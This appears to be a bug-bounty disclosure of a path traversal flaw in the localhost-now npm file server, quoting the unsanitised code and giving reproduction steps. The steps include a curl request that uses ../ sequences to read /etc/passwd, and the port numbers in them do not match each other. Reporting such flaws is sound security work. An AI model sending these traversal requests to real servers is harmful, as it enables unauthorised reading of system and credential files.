Summary:

Hi Guys,

There is Path Traversal in localhost-now module.
It allows to read content of arbitrary files on the remote server.

## Module

**localhost-now**

This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.

https://www.npmjs.com/package/localhost-now

version: 1.0.1

89 downloads in the last month

~1100 estimated downloads per year


## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user:

```javascript
// node_modules/localhost-now/lib/app.js, line 10:
    var url = req.url;

    if (url.indexOf('?') != -1) {
        url = url.split('?')[0];
    }

    var file = url === "/" ? "/index.html" : url;

    fs.readFile(path.normalize(process.cwd()) + file, function(err, data) {

```
Path is read directly from request and used to read content of file without checking against Path Traversal attempt.

## Steps To Reproduce:


- install ```localhost-now```:

```
$ npm install localhost-now
```

- run ```localhost-now``` in direcotry of your choice:

```
me:~/playground/hackerone/Node$ ./node_modules/localhost-now/bin/localhost 
Web Server started on localhost:1337
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

- see result:

```
*   Trying ::1...
* Connected to localhost (::1) port 1337 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/7.47.0
> Accept: */*

Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.
